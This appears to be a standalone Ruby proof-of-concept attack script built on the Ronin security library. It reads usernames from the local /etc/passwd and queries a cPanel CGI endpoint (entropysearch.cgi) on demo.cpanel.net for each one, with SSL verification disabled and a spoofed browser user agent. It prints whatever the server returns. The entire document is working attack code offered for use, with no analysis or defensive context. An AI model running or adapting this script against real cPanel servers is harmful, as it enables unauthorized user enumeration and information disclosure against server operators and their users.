#!/usr/bin/env ruby

require 'ronin/support'
require 'cgi'

PASSWD_PATH = '/etc/passwd'

include Ronin
include Ronin::Network
include Ronin::Network::HTTP

Ronin::Network::SSL::VERIFY = false

class GetpwnamCpanel
  def initialize(options = {})
    aret, @@save_path, @@save_url = Array.new, options[:path].clone, options[:url].clone

    File.open(PASSWD_PATH, 'r').each do |l|
      begin
	@user = l.split(%r{:})[0] 
      rescue Exception => e
      end

      @user.strip!

      next if not @user or @user.empty?

      options[:url] = @@save_url + @user
      options[:path] = @@save_path + @user
      page = http_request(options)
      line = page.body

      next if not line or line.empty?

      STDOUT.puts line

      aret << line
    end

    aret
  end
end

optz = {:ssl => true, 
        :port => 443,
	:host => 'demo.cpanel.net',
	:url => 'https://demo.cpanel.net/cgi-sys/entropysearch.cgi?user=',
	:method => :GET,
	:path => '/cgi-sys/entropysearch.cgi?user=',
	:headers => {:User_Agent => 'MSIE', :Host => 'demo.cpanel.net'} }

GetpwnamCpanel.new(optz)

exit 0
